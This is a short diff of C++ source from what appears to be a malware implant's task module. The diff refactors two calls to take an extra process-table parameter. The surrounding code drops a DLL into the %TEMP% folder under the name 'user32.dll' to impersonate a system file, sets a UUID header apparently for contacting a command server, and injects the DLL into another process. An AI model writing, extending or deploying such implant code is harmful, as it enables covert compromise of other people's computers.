@@ -9,7 +9,7 @@ namespace Task
 
         // Set the DLL file path to inject
         std::wstring wDllDestName = L"user32.dll"; // Impersonate the file name.
-        std::wstring wDllDest = System::Env::GetStrings(L"%TEMP%") + L"\\" + wDllDestName;
+        std::wstring wDllDest = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\" + wDllDestName;
         size_t dwDllDestSize = (wDllDest.size() + 1) * sizeof(wchar_t);
 
         std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
@@ -30,7 +30,7 @@ namespace Task
         }
 
         // Inject DLL
-        if (!Technique::Injection::DllInjection(dwPid, (LPVOID)wDllDest.c_str(), dwDllDestSize))
+        if (!Technique::Injection::DllInjection(pState->pProcs, dwPid, (LPVOID)wDllDest.c_str(), dwDllDestSize))
         {
             return L"Error: Failed to injection DLL.";
         }
